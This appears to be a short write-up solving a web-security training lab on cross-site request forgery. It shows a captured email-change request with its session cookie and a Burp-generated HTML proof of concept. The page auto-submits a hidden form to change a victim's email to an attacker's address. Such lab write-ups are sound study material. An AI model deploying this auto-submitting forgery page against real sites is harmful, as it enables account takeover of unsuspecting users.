# Lab: CSRF vulnerability with no defenses

- After logging with given credentials, I can see a relevant function of `chaning an email`.

![](Vulnerabilities/CSRF/img/lab-1-1.png)

- The application is validating user request based on `session` cookie.
- The only known `POST` parameter `email` is known to the attacker. 

```
POST /my-account/change-email HTTP/1.1
Host: acdd1f0c1f9a3df7c0360f220049004e.web-security-academy.net
Cookie: session=M5b2Inj1Db9rvJrTDLw3Y3bAgiplHK4Y
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: https://acdd1f0c1f9a3df7c0360f220049004e.web-security-academy.net
Referer: https://acdd1f0c1f9a3df7c0360f220049004e.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

email=root%40nehal.rocks
```

- `CSRF` attack might be possible in this case.
- Exploit HTML - 

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acdd1f0c1f9a3df7c0360f220049004e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="root&#64;nehal&#46;hacks" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

- The above exploit changes a user's email to `root@nehal.hacks`.